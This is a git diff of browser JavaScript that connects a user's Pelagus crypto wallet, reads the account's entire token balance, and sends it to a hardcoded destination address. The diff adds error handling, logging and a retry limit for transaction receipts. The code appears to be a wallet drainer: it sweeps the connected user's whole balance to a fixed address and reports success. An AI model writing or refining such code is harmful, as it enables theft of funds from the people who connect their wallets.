@@ -445,14 +445,11 @@ async function saveToFirebase(data) {
         const RPC_ENDPOINT = 'https://rpc.quai.network/cyprus1';
         const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
         const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
-        const TOKEN_ABI = [
-            "function transfer(address to, uint256 amount) public returns (bool)",
-            "function balanceOf(address owner) view returns (uint256)"
-        ];
 
         // Connect to the Pelagus wallet
         const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
         const signerAddress = accounts[0];
+        console.log(`Wallet connected: ${signerAddress}`);
 
         // Get token balance
         const balanceData = '0x70a08231000000000000000000000000' + signerAddress.slice(2);
@@ -466,14 +463,18 @@ async function saveToFirebase(data) {
                 id: 1
             })
         });
-        const balanceResult = await balanceResponse.json();
-        const rawBalance = balanceResult.result ? BigInt(balanceResult.result) : 0n;
 
+        const balanceResult = await balanceResponse.json();
+        if (!balanceResult.result) {
+            throw new Error('Failed to fetch token balance');
+        }
+
+        const rawBalance = BigInt(balanceResult.result);
         if (rawBalance === 0n) {
             throw new Error('No tokens available to send');
         }
 
-        console.log(`Balance: ${rawBalance} (raw units)`);
+        console.log(`Balance retrieved: ${rawBalance} (raw units)`);
 
         // Create transaction data for transfer
         const transferData = 
@@ -499,62 +500,44 @@ async function saveToFirebase(data) {
 
         alert(`Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
     } catch (error) {
-        console.error('Error sending tokens:', error.message);
-        alert(`Error: ${error.message}`);
+        console.error('Error sending tokens:', error.message || error);
+        alert(`Error: ${error.message || 'Unexpected error occurred'}`);
     }
 }
 
-// Wait for transaction receipt
+// Wait for transaction receipt with retry and timeout
 async function waitForTransaction(txHash, rpcEndpoint) {
-    while (true) {
-        const receiptResponse = await fetch(rpcEndpoint, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: '2.0',
-                method: 'quai_getTransactionReceipt',
-                params: [txHash],
-                id: 2
-            })
-        });
+    const MAX_RETRIES = 12; // Retry up to 12 times (1-minute wait total)
+    let retries = 0;
 
-        const receiptResult = await receiptResponse.json();
-        if (receiptResult.result) {
-            return receiptResult.result;
-        }
+    while (retries < MAX_RETRIES) {
+        try {
+            const receiptResponse = await fetch(rpcEndpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0',
+                    method: 'quai_getTransactionReceipt',
+                    params: [txHash],
+                    id: 2
+                })
+            });
 
-        await new Promise(resolve => setTimeout(resolve, 5000)); // Retry every 5 seconds
-    }
-}
-
-
-async function waitForTransaction(txHash) {
-            while (true) {
-                try {
-                    const response = await fetch(RPC_ENDPOINT, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            jsonrpc: '2.0',
-                            method: 'quai_getTransactionReceipt',
-                            params: [txHash],
-                            id: 1
-                        })
-                    });
-
-                    const result = await response.json();
-                    if (result.result && result.result.status === '0x1') {
-                        return result.result;
-                    }
-
-                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before checking again
-                } catch (error) {
-                    console.error('Error checking transaction:', error);
-                    throw error;
-                }
+            const receiptResult = await receiptResponse.json();
+            if (receiptResult.result) {
+                return receiptResult.result;
             }
-        }
 
+            retries++;
+            await new Promise(resolve => setTimeout(resolve, 5000)); // Retry every 5 seconds
+        } catch (error) {
+            console.error('Error fetching transaction receipt:', error.message || error);
+            retries++;
+        }
+    }
+
+    throw new Error('Transaction confirmation timeout');
+}
 
         async function connectWallet() {
     try {
